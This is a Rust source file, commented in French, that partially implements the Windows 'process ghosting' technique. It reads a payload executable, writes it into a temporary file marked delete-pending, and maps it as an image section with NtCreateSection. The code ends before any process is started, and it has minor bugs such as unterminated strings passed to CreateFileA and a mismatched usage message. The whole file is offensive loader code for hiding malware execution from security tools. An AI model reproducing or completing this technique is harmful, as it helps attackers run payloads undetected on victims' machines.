//Référence : https://whokilleddb.github.io/blogs/posts/process-ghosting/

use std::{
    env,
    fs,
    mem::{size_of, zeroed},
    path::Path,
    ptr::null_mut,
};

use winapi::{
    shared::{
        minwindef::{DWORD, FALSE, LPCVOID, LPVOID},
        ntdef::{
            HANDLE, NTSTATUS, NT_SUCCESS, NULL, PVOID,
        },
        ntstatus::{
            STATUS_INVALID_PARAMETER, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_SUCCESS
        },
    },
    um::{
        errhandlingapi::GetLastError, fileapi::{CreateFileA, GetFileSize, WriteFile, FILE_DISPOSITION_INFO, OPEN_ALWAYS, OPEN_EXISTING}, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, memoryapi::{MapViewOfFile, UnmapViewOfFile, VirtualAlloc, FILE_MAP_READ}, winbase::CreateFileMappingA, winnt::{
            DELETE, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, MEM_COMMIT, MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SEC_IMAGE, SYNCHRONIZE
        }
    },
};

use ntapi::{ntioapi::{FileDispositionInformation, NtSetInformationFile, IO_STATUS_BLOCK}, ntmmapi::NtCreateSection};


#[derive(Debug)]
struct Error {
    status: NTSTATUS,
}

impl From<NTSTATUS> for Error {
    fn from(status: NTSTATUS) -> Self {
        Self { status }
    }
}

unsafe fn read_payload(payload:&str) ->Option<(PVOID,u32)>{
    let h_file = unsafe{ CreateFileA(
        payload.as_ptr() as *const _,
        GENERIC_READ,
        FILE_SHARE_READ,
        null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        null_mut(),
    )};
    if h_file == INVALID_HANDLE_VALUE {
        println!("[!] CreateFileA Failed: {}", unsafe{GetLastError()});
        return None;
    }
    println!("[+] Ouverture du payload en lecture Ok");
    
    let h_map = unsafe { CreateFileMappingA(
        h_file,
        null_mut(), 
        PAGE_READONLY,
        0, 
        0, 
        null_mut())
    };
    if h_map == INVALID_HANDLE_VALUE {
        println!("[!] CreateFileMappingA Failed: {}", unsafe{GetLastError()});
        unsafe{CloseHandle(h_file)};
        return None;
    }
    println!("[+] CreateFileMappingA Ok");

    let mapped_addr = unsafe { MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0) };
    if mapped_addr == NULL {
        println!("[!] MapViewOfFile Failed: {}", unsafe{GetLastError()});
        unsafe { 
            CloseHandle(h_map);
            CloseHandle(h_file);
        };
        return None;
    }
    println!("[+] MapViewOfFile Ok");

    let file_size = unsafe { GetFileSize(h_file, null_mut()) };
    let payload_raw = unsafe { VirtualAlloc(
        NULL,
        file_size as usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) };
    if payload_raw == NULL {
        println!("[!] VirtualAlloc Failed: {}",  unsafe{GetLastError()});
        unsafe { 
            UnmapViewOfFile(mapped_addr);
            CloseHandle(h_map);
            CloseHandle(h_file);
    };
        return None;
    }
    println!("[+] On a lu le payload, taille: 0x{:x}", file_size);

    unsafe { std::ptr::copy_nonoverlapping(
        mapped_addr as *const u8,
        payload_raw as *mut u8,
        file_size as usize,
        ) 
    };
    println!("[+] Payload copié !");

    unsafe { 
        UnmapViewOfFile(mapped_addr);
        CloseHandle(h_map);
        CloseHandle(h_file);
    };
    Some((payload_raw,file_size))

}

unsafe fn write_payload(h_file:&HANDLE,payload_bytes:LPVOID,payload_size:u32) -> Option<PVOID>{
    let mut b_written: DWORD = 0;
    let ok = unsafe { WriteFile(
        *h_file,
        payload_bytes as LPCVOID,
        payload_size,
        &mut b_written,
        null_mut(),
    ) };
    if ok == FALSE {
        println!("[!] J'ai pas su écrire le payload dans le fichier temporaire (0x{:X})", unsafe { GetLastError() });
        return None;
    }
    let mut h_section: HANDLE = null_mut();
    let status = unsafe { NtCreateSection(
        &mut h_section,
        SECTION_ALL_ACCESS,
        null_mut(),
        null_mut(),            // toute la taille du fichier
        PAGE_READONLY,
        SEC_IMAGE,
        *h_file,
    ) };
    if !NT_SUCCESS(status) {
        eprintln!("[!] NtCreateSection() failed! (0x{:X})", status as u32);
        return None;
    }
    if h_section.is_null() || h_section == INVALID_HANDLE_VALUE {
        eprintln!(
            "[!] Le handle retourné par NtCreateSection() est invalide (0x{:X})",
            status as u32
        );
        return None;
    }

    println!("[+] J'ai mon objet section");
    // On retourne le handle de section comme pointeur
    Some(h_section as LPVOID)
}

unsafe fn prepare_target(cible:&str) -> Option<PVOID>{
    let h_file = unsafe {CreateFileA(
         cible.as_ptr() as *const _,
         DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
         null_mut(),
         OPEN_ALWAYS,
         FILE_ATTRIBUTE_NORMAL,
         null_mut())
    };
    if h_file == INVALID_HANDLE_VALUE {
        println!("[!] CreateFileA Failed: {}", unsafe{GetLastError()});
        return None;
    }
    println!("[+] Création du fichier: {cible}");

    let mut io_status: IO_STATUS_BLOCK = unsafe{zeroed()};

    let mut f_fileinfo = FILE_DISPOSITION_INFO {
        DeleteFile: 1,
    };
    let status: NTSTATUS = unsafe{NtSetInformationFile(
        h_file,
        &mut io_status,
        &mut f_fileinfo as *mut _ as *mut _, //pour quoi as mut as mut wtf
        size_of::<FILE_DISPOSITION_INFO>() as u32,
        FileDispositionInformation,
    )};

    if status != STATUS_SUCCESS {
        println!("[!] NtSetInformationFile failed: 0x{:X}", status);
        unsafe{CloseHandle(h_file)};
        return None;
    }
    println!("[+] Le fichier a été mis en DELETE-PENDING");
    return Some(h_file as PVOID);

}

unsafe fn process_ghosting(t_file:&str,payload:&str) -> Result<(), Error>{
       
    println!("[+] Le fichier temporaire : {t_file}");
    println!("[+] Le payload : {payload}");
    
    if let Err(e) = fs::metadata(payload) {
        println!("[!] Erreur d'accès au fichier cible : {}", e);
        return Err(Error::from(STATUS_OBJECT_NAME_NOT_FOUND)); 
    }
    //On prépare la cible (ouverture du fichier temporaire en delete pending)
    let h_file = match unsafe{prepare_target(t_file)} {
        Some(handle) => handle,
        None => return Err(Error::from(STATUS_INVALID_PARAMETER)),
    };
    println!("[+] Handle de fichier obtenu: {:?}", h_file);

    //On lit le vrai exe pour le mettre en mémoire
    let (payload_bytes,payload_size) = unsafe { read_payload(payload).ok_or_else(|| Error {status:STATUS_INVALID_PARAMETER}) }?;
    println!("[+] On a le payload a écrire dans le fichier temporaire");
    
    //On va écrire le payload dans le fichier temporaire
    let section = match unsafe {write_payload(&h_file, payload_bytes, payload_size)} {
        Some(handle) => handle,
        None => return Err(Error::from(STATUS_INVALID_PARAMETER))
    };

    Ok(())
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        let procname = Path::new(args[0].as_str())
            .file_name()
            .unwrap()
            .to_str()
            .unwrap();
        println!("Usage: {} <target> <temp>", procname);
        std::process::exit(1);
    }
    let t_file = &args[1];
    let payload = &args[2];

    unsafe {
        match process_ghosting(t_file, payload) {
            Ok(()) => println!("[+] Le process ghosting a fonctionné !"),
            Err(err) => println!("[!] Error: 0x{:x}", err.status),
        }
    }
}

